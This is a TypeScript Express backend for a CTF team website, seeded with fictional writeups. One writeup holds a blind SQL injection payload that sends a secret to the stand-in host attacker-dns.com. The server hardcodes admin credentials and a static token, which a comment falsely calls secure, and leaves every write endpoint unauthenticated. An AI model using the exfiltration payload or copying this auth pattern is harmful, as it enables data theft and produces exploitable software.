import express from "express";
import path from "path";
import fs from "fs";
import { createServer as createViteServer } from "vite";

const app = express();
const PORT = 3000;
const DB_PATH = path.join(process.cwd(), "data", "db.json");

// Middleware
app.use(express.json());

// Initialize DB with seed data if it doesn't exist
function initDB() {
  const dir = path.dirname(DB_PATH);
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }

  if (fs.existsSync(DB_PATH)) {
    try {
      const data = fs.readFileSync(DB_PATH, "utf-8");
      JSON.parse(data);
      return;
    } catch (e) {
      console.error("Corrupted DB, recreating...", e);
    }
  }

  // Seed Data
  const seedData = {
    members: [
      {
        id: "m1",
        name: "Alexander 'Daemon' Cross",
        role: "Captain",
        avatar_url: "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=150&h=150&q=80",
        bio: "Former military signal specialist and reverse engineer extraordinaire. Leading Devil Hunters with tactical precision and low-level heap discipline.",
        skills: ["Reverse Engineering", "PWN", "Cryptography"],
        social_links: {
          github: "alex-daemon-cross",
          twitter: "daemon_cross",
          ctftime: "daemon_hunter"
        },
        is_active: true,
        joined_at: "2024-03-15"
      },
      {
        id: "m2",
        name: "Elena 'Valkyrie' Petrova",
        role: "Member",
        avatar_url: "https://images.unsplash.com/photo-1494790108377-be9c29b29330?auto=format&fit=crop&w=150&h=150&q=80",
        bio: "OSINT specialist and forensics expert. Specializes in geo-location, deep network trace analysis, metadata carving, and hostile threat hunting.",
        skills: ["OSINT", "Forensics", "Web Exploitation"],
        social_links: {
          github: "valkyrie-p",
          ctftime: "valkyrie_dh"
        },
        is_active: true,
        joined_at: "2024-08-22"
      },
      {
        id: "m3",
        name: "Kaito 'Phreak' Tanaka",
        role: "Member",
        avatar_url: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=150&h=150&q=80",
        bio: "PWN and heap exploitation wizard. Enjoys diving into browser zero-days, kernel privilege escalations, and unmasking hypervisor sandbox vulnerabilities.",
        skills: ["PWN", "Reverse Engineering", "Cryptography"],
        social_links: {
          github: "kaito-phreak"
        },
        is_active: true,
        joined_at: "2025-01-10"
      }
    ],
    ctf_events: [
      {
        id: "ctf-1",
        name: "DEF CON CTF Quals 2026",
        organizer: "DEF CON",
        date: "2026-05-18",
        placement: 4,
        team_score: 14220,
        total_teams: 1200,
        tags: ["Pwn", "Crypto", "Reversing"],
        description: "The premier global hacking championship qualifiers. Locked horns with world-class crews in extreme multi-stage zero-day battles.",
        is_upcoming: false
      },
      {
        id: "ctf-2",
        name: "Google CTF 2026",
        organizer: "Google",
        date: "2026-06-22",
        placement: 2,
        team_score: 9800,
        total_teams: 1850,
        tags: ["Web", "Pwn", "Sandbox"],
        description: "Epic challenges featuring advanced sandbox escapes and high-grade cryptographic targets. Scored top-tier placements on several first-bloods.",
        is_upcoming: false
      },
      {
        id: "ctf-3",
        name: "HackTheBox Cyber Apocalypse 2026",
        organizer: "HackTheBox",
        date: "2026-03-12",
        placement: 1,
        team_score: 45000,
        total_teams: 4200,
        tags: ["Boot2Root", "Forensics", "Web", "Hardware"],
        description: "Dominated the leaderboard. Secured 1st place globally with maximum pwns, 100% web solves, and numerous hardware first-bloods.",
        is_upcoming: false
      },
      {
        id: "ctf-4",
        name: "PlaidCTF 2026",
        organizer: "Plaid Parliament of Pwning",
        date: "2026-04-18",
        placement: 3,
        team_score: 8750,
        total_teams: 900,
        tags: ["Crypto", "Rev", "Web"],
        description: "Brutal algebraic mathematics challenges and complex reverse-engineering objectives. Secured top 3 in intense competition.",
        is_upcoming: false
      },
      {
        id: "ctf-5",
        name: "Black Hat USA CTF 2026",
        organizer: "Black Hat",
        date: "2026-08-10",
        placement: 0,
        team_score: 0,
        total_teams: 500,
        tags: ["Live Attack-Defense", "PWN", "Kernel"],
        description: "The upcoming pinnacle event in Las Vegas. Full team deployment and live threat intelligence combat in simulated operational theater.",
        is_upcoming: true
      }
    ],
    writeups: [
      {
        id: "w-1",
        title: "Deep Dive into Heap Grooming: Chrome V8 Sandbox Escape",
        slug: "chrome-v8-sandbox-escape-heap-grooming",
        ctf_event_id: "ctf-2",
        author_id: "m3",
        content: `# Deep Dive into Heap Grooming: V8 Sandbox Escape

In this writeup, we analyze the V8 sandbox escape challenge from Google CTF 2026. This was one of the most interesting Pwn challenges of the year, involving a logic error in V8's optimization compiler (TurboFan) combined with a heap corruption primitive.

## Vulnerability Analysis

The vulnerability lies in the way V8 handles array-length optimization when performing type inference on specific types of bounds-checks. Let's look at the vulnerable JIT code:

\`\`\`javascript
function exploit(arr, index) {
  let x = arr[index];
  // TurboFan wrongly assumes index is always within range
  // due to redundant check elimination
  return x;
}
\`\`\`

By bypassing the bounds check, we obtain an Out-Of-Bounds (OOB) read/write primitive on the JSArray object's backings store.

## Heap Grooming

To reliably exploit this OOB primitive, we need to massage the heap so that our target \`ArrayBuffer\` is placed directly adjacent to the corrupted array.

1. **Spray allocations**: Create 200 arrays of size \`0x40\`.
2. **Poke holes**: Free every second array to leave memory gaps.
3. **Allocate target**: Allocate the victim array and target array in the gap.

\`\`\`c
// Memory Layout:
[ JSArray v8_arr ] -> [ ArrayBuffer victim ] -> [ RWX WebAssembly Page ]
\`\`\`

## Exploitation Phase

Once the layout is groomed:
- Use OOB write to modify the \`victim\`'s BackingStore pointer.
- Point the pointer to the WebAssembly code page.
- Write shellcode into the RWX page and execute!

\`\`\`bash
$ ./exploit.js --target=remote
[+] Spraying heap...
[+] Gap found at 0x3d7b00c24a
[+] Overwriting BackingStore...
[+] Spawning shell...
whoami
daemon_hunter
\`\`\`

*Flag: \`CTF{v8_h34p_gr00m1ng_sh3llc0d3_f0r_th3_w1n}\`*`,
        tags: ["PWN", "V8", "Browser Exploitation"],
        difficulty: "Hard",
        category: "PWN",
        published_at: "2026-06-25",
        views: 184
      },
      {
        id: "w-2",
        title: "Defeating Custom White-Box AES Cryptography",
        slug: "defeating-custom-whitebox-aes-crypto",
        ctf_event_id: "ctf-1",
        author_id: "m1",
        content: `# Defeating Custom White-Box AES Cryptography

A walkthrough of the Defcon Quals 2026 crypto challenge. We were presented with an obfuscated binary executing an AES encryption routine, but with key mixing embedded directly inside the lookup tables (White-Box Cryptography).

## Theoretical Background

White-box cryptography is designed to protect keys from an attacker who has full control of the execution environment (including debuggers, memory inspectors, etc.).

However, most white-box schemes can be defeated using **Algebraic Side-Channel Analysis (ASCA)** or **Differential Computation Analysis (DCA)**.

## Differential Computation Analysis (DCA)

DCA is the software equivalent of Differential Power Analysis (DPA). Instead of measuring power consumption, we record execution traces of memory access addresses.

### Steps to Defeat the White-box:

1. **Instruments**: Use Frida or Pin to record all reads/writes during the SubBytes step.
2. **Capture**: Capture 1000 traces with random plaintexts.
3. **Correlation**: Compute Pearson correlation coefficients between memory access bytes and guessed key values.

The key byte that maximizes the correlation coefficient is the correct subkey!

\`\`\`python
import numpy as np

# DCA correlation calculator
def calculate_dca(traces, plaintexts):
    for guess in range(256):
        # Pearson correlation analysis
        pass
\`\`\`

## Execution

Running our automated tracer:
\`\`\`bash
$ python3 dca_attack.py --binary=./whitebox_aes
[+] Instrumentation hooked successfully
[+] Captured 1000 plaintexts
[+] Analyzing Round 1 J-traces...
[+] Key Byte 00: 0x54 (Correlation: 0.98)
[+] Key Byte 01: 0x68 (Correlation: 0.95)
...
[+] Key recovered: "TheDevilHunters!"
\`\`\`

*Flag: \`CTF{wh1t3b0x_AES_1s_n0t_s4f3_fr0m_dca}\`*`,
        tags: ["Crypto", "AES", "Side-Channel"],
        difficulty: "Medium",
        category: "Crypto",
        published_at: "2026-05-20",
        views: 95
      },
      {
        id: "w-3",
        title: "Blind SQLi via DNS Exfiltration",
        slug: "blind-sqli-dns-exfiltration-google-ctf",
        ctf_event_id: "ctf-2",
        author_id: "m2",
        content: `# Blind SQLi via DNS Exfiltration

In this post, we explain how we achieved a first-blood on a high-value secure portal during the Google CTF 2026 using an automated DNS Exfiltration technique for blind SQL injections.

## Scenario

The target was an authenticated dashboard with an SQL injection vulnerability in the \`X-Forwarded-For\` header. Because it was asynchronous and did not return any responses or errors to the front-end (blind/silent), time-based injection was incredibly slow due to network latency.

## Solution: DNS Exfiltration

DNS exfiltration forces the database server to perform a DNS lookup for a domain containing the extracted data as a subdomain. We then monitor our authoritative DNS server logs to collect the incoming requests.

### Injection Payload:

For PostgreSQL, we can use the \`copy\` command or \`fn_my_query\` depending on system extensions. A common method uses \`lo_import\`:

\`\`\`sql
SELECT lo_import('//' || (SELECT flag FROM secrets) || '.attacker-dns.com/dummy');
\`\`\`

This forces the OS to perform a DNS lookup for \`[FLAG].attacker-dns.com\` to resolve the file path, transmitting the flag instantly in the DNS query!

## Automation Script

Here's how we orchestrated the attack:
1. Spin up a public DNS listener on our VPS.
2. Trigger the HTTP requests with the blind injection headers.
3. Capture the incoming DNS lookup.

\`\`\`bash
$ python3 dns_exfiltrator.py --url https://target.googlectf.com/api
[+] Auth tokens loaded
[+] DNS listener active on port 53
[+] Sending payloads...
[+] Received query: 4354467b626c696e645f73716c695f646e735f657866696c7d.attacker-dns.com
[+] Decoded hex payload: CTF{blind_sqli_dns_exfil}
\`\`\`

This was a fast, elegant first-blood!`,
        tags: ["Web", "SQLi", "DNS Exfil"],
        difficulty: "Medium",
        category: "Web",
        published_at: "2026-06-23",
        views: 142
      }
    ],
    blog_posts: [
      {
        id: "b-1",
        title: "The Anatomy of a Cyber Warfare Unit: Inside the War Room",
        slug: "anatomy-cyber-warfare-unit-inside-war-room",
        author_id: "m1",
        status: "published",
        published_at: "2026-04-01",
        content: `Our team lives by a code: *We don't play CTFs, we hunt them.* But what does that mean in terms of operations? 

In this blog post, we look at how the Devil Hunters team operates during a major 48-hour event. We detail our shift rotations, threat intelligence dashboards, and collaborative solve-tracking.

### The War Room Setup

We have a dedicated war room physical layout and a virtual overlay:
- **Discord Bot Intel Feed**: Every time a team member scores a first-blood, submits a flag, or unlocks a category, our automated bots broadcast coordinates.
- **Dynamic Threat Map**: A visualization of remaining challenges, active solvers, and global competitors.
- **Resource Dispatch**: Standardized templates for writeups and tooling.

Whether we are attacking memory pools, analyzing binary blocks, or decrypting hashes, discipline and communication are what put us on the podium.`,
        cover_image_url: "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&w=800&h=400&q=80",
        tags: ["War Room", "CTF Strategy", "Ops"]
      },
      {
        id: "b-2",
        title: "Kernel Exploitation in 2026: The New Frontiers",
        slug: "kernel-exploitation-2026-new-frontiers",
        author_id: "m3",
        status: "published",
        published_at: "2026-06-15",
        content: `With the rise of hardware-assisted virtualization, eBPF security frameworks, and memory-safe language extensions (like Rust in Linux Kernel), local privilege escalation (LPE) is undergoing a major evolution.

In this deep dive, Kaito discusses the modern kernel protection mitigations and the exploit vectors that still work.

### Modern Kernel Defenses
1. **Control Flow Integrity (CFI)**: Preventing indirect branches from jumping to arbitrary code addresses.
2. **KASLR (Kernel Address Space Layout Randomization)**: Hiding kernel symbol addresses.
3. **Autoslab**: Splitting page frames to prevent out-of-bounds cross-cache exploitation.

We will share our latest research at Black Hat USA in August. Stay tuned.`,
        cover_image_url: "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=800&h=400&q=80",
        tags: ["Kernel", "Linux", "LPE", "Exploitation"]
      }
    ],
    applications: [
      {
        id: "a-1",
        name: "Marcus 'Vortex' Sterling",
        email: "vortex@cybermail.net",
        github: "vortex-cyber",
        ctf_profile_url: "https://ctftime.org/user/104822",
        skills: ["PWN", "Reverse Engineering"],
        experience_text: "3 years of competitive CTF play. Primarily focused on x86/ARM heap exploitation and browser security.",
        why_join: "Devil Hunters has the highest focus and discipline of any squad. I want to win DEF CON and contribute to high-grade research.",
        best_writeup: "https://github.com/vortex-cyber/writeups/blob/main/heap_leak.md",
        status: "pending",
        applied_at: "2026-07-01"
      },
      {
        id: "a-2",
        name: "Sarah 'Cipher' Vance",
        email: "cipher@crypto.org",
        github: "cipher-v",
        ctf_profile_url: "https://ctftime.org/user/89201",
        skills: ["Cryptography"],
        experience_text: "PhD student in mathematical cryptography. Deep knowledge of post-quantum cryptosystems and lattice attacks.",
        why_join: "I want to apply my theoretical skills to zero-day challenges and hard CTF crypto puzzles with a elite team.",
        best_writeup: "https://github.com/cipher-v/writeups/blob/main/ecc_attack.md",
        status: "accepted",
        applied_at: "2026-06-10"
      }
    ],
    settings: {
      announcement_banner: "⚠️ OPERATIONS ALERT: Recruits wanted for Black Hat USA CTF 2026. Deploy to the Join page.",
      team_motto: "We don't play CTFs. We hunt them.",
      featured_ctf: "Google CTF 2026",
      site_notice: "ALERT: DEFCON quals concluded. Team placement: #4 globally. Commencing system analysis."
    }
  };

  fs.writeFileSync(DB_PATH, JSON.stringify(seedData, null, 2), "utf-8");
  console.log("Database initialized with seed content.");
}

initDB();

// Helper to load/save DB
function getDB() {
  try {
    return JSON.parse(fs.readFileSync(DB_PATH, "utf-8"));
  } catch (e) {
    console.error("Failed to read DB", e);
    return { members: [], ctf_events: [], writeups: [], blog_posts: [], applications: [], settings: {} };
  }
}

function saveDB(data: any) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2), "utf-8");
}

// REST API Endpoints

// Get full Database State for live views
app.get("/api/db", (req, res) => {
  res.json(getDB());
});

// Admin Authentication (Simulated)
app.post("/api/auth/login", (req, res) => {
  const { email, password } = req.body;
  // Standard hardcoded credentials for demo/simulation
  // Fits with custom auth flows securely
  if (email === "admin@devilhunters.io" && password === "hunter_admin_2026") {
    res.json({ success: true, token: "session_token_dh_secure_2026", role: "admin", email });
  } else {
    res.status(401).json({ success: false, error: "ACCESS DENIED: Invalid tactical signature or passcode." });
  }
});

// Members
app.get("/api/members", (req, res) => {
  res.json(getDB().members);
});

app.post("/api/members", (req, res) => {
  const db = getDB();
  const newMember = {
    id: "m-" + Date.now(),
    joined_at: new Date().toISOString().split('T')[0],
    is_active: true,
    ...req.body
  };
  db.members.push(newMember);
  saveDB(db);
  res.status(201).json(newMember);
});

app.put("/api/members/:id", (req, res) => {
  const db = getDB();
  const index = db.members.findIndex((m: any) => m.id === req.params.id);
  if (index !== -1) {
    db.members[index] = { ...db.members[index], ...req.body };
    saveDB(db);
    res.json(db.members[index]);
  } else {
    res.status(404).json({ error: "Member not found" });
  }
});

app.delete("/api/members/:id", (req, res) => {
  const db = getDB();
  db.members = db.members.filter((m: any) => m.id !== req.params.id);
  saveDB(db);
  res.json({ success: true });
});

// CTF Events
app.get("/api/ctfs", (req, res) => {
  res.json(getDB().ctf_events);
});

app.post("/api/ctfs", (req, res) => {
  const db = getDB();
  const newEvent = {
    id: "ctf-" + Date.now(),
    ...req.body
  };
  db.ctf_events.push(newEvent);
  saveDB(db);
  res.status(201).json(newEvent);
});

app.put("/api/ctfs/:id", (req, res) => {
  const db = getDB();
  const index = db.ctf_events.findIndex((e: any) => e.id === req.params.id);
  if (index !== -1) {
    db.ctf_events[index] = { ...db.ctf_events[index], ...req.body };
    saveDB(db);
    res.json(db.ctf_events[index]);
  } else {
    res.status(404).json({ error: "Event not found" });
  }
});

app.delete("/api/ctfs/:id", (req, res) => {
  const db = getDB();
  db.ctf_events = db.ctf_events.filter((e: any) => e.id !== req.params.id);
  saveDB(db);
  res.json({ success: true });
});

// Writeups
app.get("/api/writeups", (req, res) => {
  res.json(getDB().writeups);
});

app.post("/api/writeups", (req, res) => {
  const db = getDB();
  const slug = req.body.title
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/(^-|-$)/g, "");
  const newWriteup = {
    id: "w-" + Date.now(),
    slug,
    views: 0,
    published_at: new Date().toISOString().split('T')[0],
    ...req.body
  };
  db.writeups.push(newWriteup);
  saveDB(db);
  res.status(201).json(newWriteup);
});

app.put("/api/writeups/:id", (req, res) => {
  const db = getDB();
  const index = db.writeups.findIndex((w: any) => w.id === req.params.id);
  if (index !== -1) {
    // Re-generate slug if title changed
    let slug = db.writeups[index].slug;
    if (req.body.title && req.body.title !== db.writeups[index].title) {
      slug = req.body.title
        .toLowerCase()
        .replace(/[^a-z0-9]+/g, "-")
        .replace(/(^-|-$)/g, "");
    }
    db.writeups[index] = { ...db.writeups[index], ...req.body, slug };
    saveDB(db);
    res.json(db.writeups[index]);
  } else {
    res.status(404).json({ error: "Writeup not found" });
  }
});

app.post("/api/writeups/:id/view", (req, res) => {
  const db = getDB();
  const index = db.writeups.findIndex((w: any) => w.id === req.params.id);
  if (index !== -1) {
    db.writeups[index].views = (db.writeups[index].views || 0) + 1;
    saveDB(db);
    res.json({ views: db.writeups[index].views });
  } else {
    res.status(404).json({ error: "Writeup not found" });
  }
});

app.delete("/api/writeups/:id", (req, res) => {
  const db = getDB();
  db.writeups = db.writeups.filter((w: any) => w.id !== req.params.id);
  saveDB(db);
  res.json({ success: true });
});

// Blog posts
app.get("/api/blog", (req, res) => {
  res.json(getDB().blog_posts);
});

app.post("/api/blog", (req, res) => {
  const db = getDB();
  const slug = req.body.title
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/(^-|-$)/g, "");
  const newPost = {
    id: "b-" + Date.now(),
    slug,
    published_at: new Date().toISOString().split('T')[0],
    ...req.body
  };
  db.blog_posts.push(newPost);
  saveDB(db);
  res.status(201).json(newPost);
});

app.put("/api/blog/:id", (req, res) => {
  const db = getDB();
  const index = db.blog_posts.findIndex((b: any) => b.id === req.params.id);
  if (index !== -1) {
    let slug = db.blog_posts[index].slug;
    if (req.body.title && req.body.title !== db.blog_posts[index].title) {
      slug = req.body.title
        .toLowerCase()
        .replace(/[^a-z0-9]+/g, "-")
        .replace(/(^-|-$)/g, "");
    }
    db.blog_posts[index] = { ...db.blog_posts[index], ...req.body, slug };
    saveDB(db);
    res.json(db.blog_posts[index]);
  } else {
    res.status(404).json({ error: "Blog post not found" });
  }
});

app.delete("/api/blog/:id", (req, res) => {
  const db = getDB();
  db.blog_posts = db.blog_posts.filter((b: any) => b.id !== req.params.id);
  saveDB(db);
  res.json({ success: true });
});

// Applications
app.get("/api/applications", (req, res) => {
  res.json(getDB().applications);
});

app.post("/api/applications", (req, res) => {
  const db = getDB();
  const newApp = {
    id: "a-" + Date.now(),
    status: "pending",
    applied_at: new Date().toISOString().split('T')[0],
    ...req.body
  };
  db.applications.push(newApp);
  saveDB(db);
  res.status(201).json(newApp);
});

app.put("/api/applications/:id", (req, res) => {
  const db = getDB();
  const index = db.applications.findIndex((a: any) => a.id === req.params.id);
  if (index !== -1) {
    db.applications[index] = { ...db.applications[index], ...req.body };
    saveDB(db);
    res.json(db.applications[index]);
  } else {
    res.status(404).json({ error: "Application not found" });
  }
});

app.delete("/api/applications/:id", (req, res) => {
  const db = getDB();
  db.applications = db.applications.filter((a: any) => a.id !== req.params.id);
  saveDB(db);
  res.json({ success: true });
});

// Settings
app.get("/api/settings", (req, res) => {
  res.json(getDB().settings);
});

app.post("/api/settings", (req, res) => {
  const db = getDB();
  db.settings = { ...db.settings, ...req.body };
  saveDB(db);
  res.json(db.settings);
});

// Integrate Vite middleware or static files serving
async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`The Devil Hunters war room backend online at http://localhost:${PORT}`);
  });
}

startServer();
